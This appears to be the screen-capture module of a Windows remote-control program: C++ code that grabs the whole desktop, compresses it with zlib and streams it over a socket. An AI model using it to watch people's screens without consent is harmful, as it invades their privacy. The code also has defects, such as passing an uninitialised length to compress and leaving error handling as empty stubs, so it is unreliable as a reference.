#include "SCREEN.h"



CSCREEN::CSCREEN(SOCKET s)
{
    m_socket = s;
}


CSCREEN::~CSCREEN()
{
}


#define errhandler(msg, hwnd) 

PBITMAPINFO CSCREEN::CreateBitmapInfoStruct(HWND hwnd, HBITMAP hBmp)
{
    BITMAP bmp;
    PBITMAPINFO pbmi;
    WORD    cClrBits;

    // Retrieve the bitmap color format, width, and height. 
    if (!GetObject(hBmp, sizeof(BITMAP), (LPSTR)&bmp))
        errhandler("GetObject", hwnd);

    // Convert the color format to a count of bits. 
    cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);
    if (cClrBits == 1)
        cClrBits = 1;
    else if (cClrBits <= 4)
        cClrBits = 4;
    else if (cClrBits <= 8)
        cClrBits = 8;
    else if (cClrBits <= 16)
        cClrBits = 16;
    else if (cClrBits <= 24)
        cClrBits = 24;
    else cClrBits = 32;

    // Allocate memory for the BITMAPINFO structure. (This structure 
    // contains a BITMAPINFOHEADER structure and an array of RGBQUAD 
    // data structures.) 

    if (cClrBits != 24)
        pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
            sizeof(BITMAPINFOHEADER) +
            sizeof(RGBQUAD) * (1 << cClrBits));

    // There is no RGBQUAD array for the 24-bit-per-pixel format. 

    else
        pbmi = (PBITMAPINFO)LocalAlloc(LPTR,
            sizeof(BITMAPINFOHEADER));

    // Initialize the fields in the BITMAPINFO structure. 

    pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    pbmi->bmiHeader.biWidth = bmp.bmWidth;
    pbmi->bmiHeader.biHeight = bmp.bmHeight;
    pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
    pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
    if (cClrBits < 24)
        pbmi->bmiHeader.biClrUsed = (1 << cClrBits);

    // If the bitmap is not compressed, set the BI_RGB flag. 
    pbmi->bmiHeader.biCompression = BI_RGB;

    // Compute the number of bytes in the array of color 
    // indices and store the result in biSizeImage. 
    // For Windows NT, the width must be DWORD aligned unless 
    // the bitmap is RLE compressed. This example shows this. 
    // For Windows 95/98/Me, the width must be WORD aligned unless the 
    // bitmap is RLE compressed.
    pbmi->bmiHeader.biSizeImage = ((pbmi->bmiHeader.biWidth * cClrBits + 31) & ~31) / 8
        * pbmi->bmiHeader.biHeight;
    // Set biClrImportant to 0, indicating that all of the 
    // device colors are important. 
    pbmi->bmiHeader.biClrImportant = 0;
    return pbmi;
}

void CSCREEN::CreateBMPFile(HWND hwnd, LPTSTR pszFile, PBITMAPINFO pbi, HBITMAP hBMP, HDC hDC)
{
    HANDLE hf;                 // file handle 
    BITMAPFILEHEADER hdr;       // bitmap file-header 
    PBITMAPINFOHEADER pbih;     // bitmap info-header 
    LPBYTE lpBits;              // memory pointer 
    DWORD dwTotal;              // total count of bytes 
    DWORD cb;                   // incremental count of bytes 
    BYTE *hp;                   // byte pointer 
    DWORD dwTmp;

    pbih = (PBITMAPINFOHEADER)pbi;
    lpBits = (LPBYTE)GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);

    if (!lpBits)
        errhandler("GlobalAlloc", hwnd);

    // Retrieve the color table (RGBQUAD array) and the bits 
    // (array of palette indices) from the DIB. 
    if (!GetDIBits(hDC, hBMP, 0, (WORD)pbih->biHeight, lpBits, pbi,
        DIB_RGB_COLORS))
    {
        errhandler("GetDIBits", hwnd);
    }

    // Create the .BMP file. 
    hf = CreateFile(pszFile,
        GENERIC_READ | GENERIC_WRITE,
        (DWORD)0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        (HANDLE)NULL);
    if (hf == INVALID_HANDLE_VALUE)
        errhandler("CreateFile", hwnd);
    hdr.bfType = 0x4d42;        // 0x42 = "B" 0x4d = "M" 
                                // Compute the size of the entire file. 
    hdr.bfSize = (DWORD)(sizeof(BITMAPFILEHEADER) +
        pbih->biSize + pbih->biClrUsed
        * sizeof(RGBQUAD) + pbih->biSizeImage);
    hdr.bfReserved1 = 0;
    hdr.bfReserved2 = 0;

    // Compute the offset to the array of color indices. 
    hdr.bfOffBits = (DWORD) sizeof(BITMAPFILEHEADER) +
        pbih->biSize + pbih->biClrUsed
        * sizeof(RGBQUAD);

    // Copy the BITMAPFILEHEADER into the .BMP file. 
    if (!WriteFile(hf, (LPVOID)&hdr, sizeof(BITMAPFILEHEADER),
        (LPDWORD)&dwTmp, NULL))
    {
        errhandler("WriteFile", hwnd);
    }

    // Copy the BITMAPINFOHEADER and RGBQUAD array into the file. 
    WriteFile(hf, (LPVOID)pbih, sizeof(BITMAPINFOHEADER)
        + pbih->biClrUsed * sizeof(RGBQUAD),
        (LPDWORD)&dwTmp, (NULL));

    // Copy the array of color indices into the .BMP file. 
    dwTotal = cb = pbih->biSizeImage;
    hp = lpBits;
    if (!WriteFile(hf, (LPSTR)hp, (int)cb, (LPDWORD)&dwTmp, NULL))
        errhandler("WriteFile", hwnd);

    // Close the .BMP file. 
    if (!CloseHandle(hf))
        errhandler("CloseHandle", hwnd);

    // Free memory. 
    GlobalFree((HGLOBAL)lpBits);
}

int CSCREEN::screenSnap()
{
    int result = 0;
    //1024*768
    //获取屏幕分辨率
    int screenWidth = ::GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = ::GetSystemMetrics(SM_CYSCREEN);

    //获取桌面dc
    HDC hdcScreen = ::CreateDC("DISPLAY", NULL, NULL, NULL);
    //check

    //创建内存dc
    HDC hdcCompatible = ::CreateCompatibleDC(hdcScreen);
    //check

    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    //check

    //选择位图
    SelectObject(hdcCompatible, hbmScreen);
    //check

    //拷贝位图
    BitBlt(hdcCompatible,
        0, 0,
        screenWidth, screenHeight,
        hdcScreen,
        0, 0,
        SRCCOPY);
    //check

    //保存图片
    //PBITMAPINFO pbi = CreateBitmapInfoStruct(NULL, hbmScreen);
    //CreateBMPFile(NULL, "test.bmp", pbi, hbmScreen, hdcCompatible);

    int TotalSize = screenWidth * screenHeight * sizeof(long);
    LPVOID lpBits = (LPBYTE)GlobalAlloc(GMEM_FIXED, TotalSize);

    GetBitmapBits(hbmScreen, TotalSize, lpBits);


    //压缩
    using COMPRESS = int(*)(void*, unsigned long*, void*, unsigned long);
//    using UNCOMPRESS = int(*)(void*, unsigned long*, void*, unsigned long);
    HMODULE hDll = LoadLibrary(".\\zlib1.dll");
    COMPRESS compress = (COMPRESS)GetProcAddress(hDll, "compress");
//    UNCOMPRESS uncompress = (UNCOMPRESS)GetProcAddress(hDll, "uncompress");


    LPVOID outBuff = new char[TotalSize];
    unsigned long len;//压缩的长度
    compress(outBuff, &len, lpBits, TotalSize);

    //发送数据头
    HEADER head;
    head.nCmd = SCREEN_INFO;
    head.nLen = len;

    send(m_socket, (char*)&head, sizeof(head), 0);

    //发送尺寸
    SIZESCREEN scSize;
    scSize.nHigh = screenHeight;
    scSize.nWidth = screenWidth;
    scSize.nSize = TotalSize;

    send(m_socket, (char*)&scSize, sizeof(scSize), 0);
    
    //发送数据
    int SendBytes = 0;
    int bytes = 0;
    while (SendBytes < len)
    {
        bytes = send(m_socket, (char*)outBuff + SendBytes, len - SendBytes, 0);
        if (bytes <= 0)
        {
            result = -1;
            goto SAFE_EXIT;
        }

        SendBytes += bytes;
    }

SAFE_EXIT:
    GlobalFree((HGLOBAL)lpBits);
    delete[] outBuff;
    DeleteDC(hdcCompatible);
    DeleteDC(hdcScreen);
    DeleteObject(hbmScreen);
    return result;
}







